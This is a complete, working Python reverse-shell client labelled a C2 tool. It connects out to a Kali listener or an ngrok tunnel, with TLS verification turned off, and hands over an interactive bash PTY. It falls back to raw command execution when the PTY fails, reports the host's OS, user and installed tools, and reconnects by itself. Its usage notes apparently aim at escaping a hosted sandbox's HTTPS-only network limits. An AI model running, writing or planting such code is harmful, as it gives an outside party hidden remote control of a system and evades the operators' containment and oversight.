#!/usr/bin/env python3
"""
C2 Streaming Reverse Shell - Sandbox Side
Connects to Kali listener and provides a real-time interactive shell.
Auto-reconnects if connection drops.

Usage: python3 c2_stream_shell.py <KALI_IP> <PORT> [--ssl]
  --ssl : Use TLS (required if sandbox is on free plan - HTTPS only)
"""

import socket
import subprocess
import ssl
import sys
import os
import time
import pty
import select
import signal
import threading

class StreamShell:
    def __init__(self, host, port, use_ssl=False, auto_reconnect=True):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.auto_reconnect = auto_reconnect
        self.running = True
        
    def connect(self):
        """Establish connection to Kali listener"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
        
        sock.connect((self.host, int(self.port)))
        sock.settimeout(None)
        return sock
    
    def interactive_shell(self, sock):
        """Full interactive PTY shell - supports vim, nmap, etc."""
        # Create a PTY
        master, slave = pty.openpty()
        
        # Fork a child process
        pid = os.fork()
        
        if pid == 0:
            # Child process
            os.setsid()
            os.dup2(slave, 0)  # stdin
            os.dup2(slave, 1)  # stdout
            os.dup2(slave, 2)  # stderr
            os.close(master)
            os.close(slave)
            
            # Set terminal size
            import struct, fcntl, termios
            winsize = struct.pack("HHHH", 24, 80, 0, 0)
            fcntl.ioctl(slave, termios.TIOCSWINSZ, winsize)
            
            # Set environment
            os.environ['TERM'] = 'xterm-256color'
            os.environ['PS1'] = '\\u@sandbox:\\w\\$ '
            
            # Execute shell
            os.execvp('/bin/bash', ['/bin/bash', '-l'])
        else:
            # Parent process
            os.close(slave)
            
            sock.sendall(b"[+] Connection established - streaming shell\n")
            sock.sendall(b"[+] Sandbox: " + os.uname().sysname.encode() + b" " + os.uname().release.encode() + b"\n")
            sock.sendall(b"[+] User: " + os.getenv('USER', 'root').encode() + b"\n")
            sock.sendall(b"[+] Tools: ")
            
            # Check available tools
            tools = []
            for tool in ['nmap', 'python3', 'curl', 'wget', 'nc', 'dig', 'nslookup', 'git', 'pip3']:
                if os.system(f'which {tool} > /dev/null 2>&1') == 0:
                    tools.append(tool)
            sock.sendall(b", ".join(t.encode() for t in tools) + b"\n")
            sock.sendall(b"\n")
            
            # Bidirectional relay: socket <-> PTY
            while self.running:
                try:
                    rlist, _, _ = select.select([sock, master], [], [], 1)
                    
                    for fd in rlist:
                        if fd == sock:
                            # Data from Kali -> PTY
                            data = sock.recv(4096)
                            if not data:
                                self.running = False
                                break
                            os.write(master, data)
                        
                        elif fd == master:
                            # Data from PTY -> Kali (STREAMING OUTPUT)
                            data = os.read(master, 4096)
                            if data:
                                sock.sendall(data)
                
                except (ConnectionError, BrokenPipeError, OSError):
                    self.running = False
                    break
            
            # Cleanup
            try:
                os.kill(pid, signal.SIGTERM)
                os.waitpid(pid, 0)
            except:
                pass
            os.close(master)
    
    def simple_shell(self, sock):
        """Simple command execution shell (no PTY) - fallback"""
        sock.sendall(b"[+] Connection established (simple mode)\n")
        sock.sendall(b"[+] Type commands. Output streams in real-time.\n\n")
        
        while self.running:
            try:
                # Read command from Kali
                sock.sendall(b"sandbox> ")
                cmd = b""
                while True:
                    byte = sock.recv(1)
                    if not byte:
                        self.running = False
                        return
                    if byte == b"\n":
                        break
                    cmd += byte
                
                cmd = cmd.decode().strip()
                if not cmd:
                    continue
                if cmd in ['exit', 'quit']:
                    sock.sendall(b"[*] Closing connection\n")
                    return
                
                # Execute and stream output in real-time
                proc = subprocess.Popen(
                    cmd, shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE
                )
                
                # Stream output line by line
                for line in iter(proc.stdout.readline, b''):
                    sock.sendall(line)
                
                proc.wait()
                sock.sendall(b"\n")
                
            except (ConnectionError, BrokenPipeError, OSError):
                self.running = False
                break
    
    def run(self):
        """Main loop with auto-reconnect"""
        print(f"[*] C2 Stream Shell - Connecting to {self.host}:{self.port}")
        print(f"[*] SSL: {'ON' if self.use_ssl else 'OFF'}")
        print(f"[*] Auto-reconnect: {'ON' if self.auto_reconnect else 'OFF'}")
        
        while self.running:
            try:
                sock = self.connect()
                print(f"[+] Connected to {self.host}:{self.port}")
                
                # Try interactive PTY shell first, fallback to simple
                try:
                    self.interactive_shell(sock)
                except Exception as e:
                    print(f"[-] PTY mode failed ({e}), falling back to simple mode")
                    sock.close()
                    sock = self.connect()
                    self.simple_shell(sock)
                
                sock.close()
                print(f"[-] Connection closed")
                
            except Exception as e:
                print(f"[!] Connection failed: {e}")
            
            if not self.auto_reconnect:
                break
            
            if self.running:
                print(f"[*] Reconnecting in 5 seconds...")
                time.sleep(5)
        
        print(f"[*] Shell stopped")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 c2_stream_shell.py <KALI_IP> <PORT> [--ssl]")
        print("")
        print("Examples:")
        print("  # Paid plan (full network access):")
        print("  python3 c2_stream_shell.py 192.168.1.100 4444")
        print("")
        print("  # Free plan (HTTPS only - requires SSL listener on Kali):")
        print("  python3 c2_stream_shell.py your.ngrok.io 443 --ssl")
        print("")
        print("  # With ngrok TCP tunnel:")
        print("  python3 c2_stream_shell.py 0.tcp.ngrok.io 12345")
        sys.exit(1)
    
    host = sys.argv[1]
    port = sys.argv[2]
    use_ssl = '--ssl' in sys.argv
    
    shell = StreamShell(host, port, use_ssl=use_ssl, auto_reconnect=True)
    
    # Handle Ctrl+C gracefully
    def sigint_handler(sig, frame):
        shell.running = False
        print("\n[*] Shutting down...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, sigint_handler)
    shell.run()
